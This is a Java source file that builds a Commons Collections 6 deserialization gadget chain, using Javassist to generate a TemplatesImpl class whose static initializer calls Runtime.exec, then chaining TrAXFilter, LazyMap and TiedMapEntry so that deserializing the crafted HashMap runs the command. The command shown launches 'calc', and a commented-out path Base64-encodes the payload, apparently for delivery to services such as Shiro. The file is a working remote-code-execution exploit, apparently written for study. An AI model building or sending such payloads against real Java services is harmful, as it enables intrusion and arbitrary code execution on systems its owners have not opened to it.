package gadget.cc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.codec.Base64;
import util.ReflectionUtils;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC6_3 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, CannotCompileException, NotFoundException {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"calc\"});";
        cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"calc\"});";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();


        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");

        ChainedTransformer c = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        HashMap map=new HashMap();
        Map lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));//先放进去一个触发不了的,避免序列化的时候触发

        TiedMapEntry tiedMapEntry=new TiedMapEntry(map,"Squirt1e");
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        hashmap.put(tiedMapEntry,"Squirt1e");

        Class claz=TiedMapEntry.class;
        Field tiedMap=claz.getDeclaredField("map");
        tiedMap.setAccessible(true);
        tiedMap.set(tiedMapEntry,lazyMap);

        // 将factory重新赋值为lazyMap从而触发factory.transform
        Class clazz=LazyMap.class;
        Field factory=clazz.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,c);

//        String encoder = java.util.Base64.getEncoder().encodeToString(serialize(hashmap));
//        unserialize(Base64.decodeToString(encoder));
//        System.out.println(encoder);
        unserialize(serialize(hashmap));
    }


    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        try {
            ByteArrayInputStream ais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(ais);
            ois.readObject();
            ois.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

